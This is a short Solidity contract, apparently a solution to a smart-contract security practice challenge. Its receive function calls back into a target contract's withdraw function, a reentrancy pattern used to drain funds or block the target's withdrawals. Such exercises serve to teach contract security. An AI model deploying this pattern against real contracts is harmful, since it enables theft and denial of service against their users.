// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract DenialAttack {
    Denial public denial;

    constructor(Denial _denial) {
        denial = _denial;
    }

    // allow deposit of funds
    receive() external payable {
        denial.withdraw();
    }
}
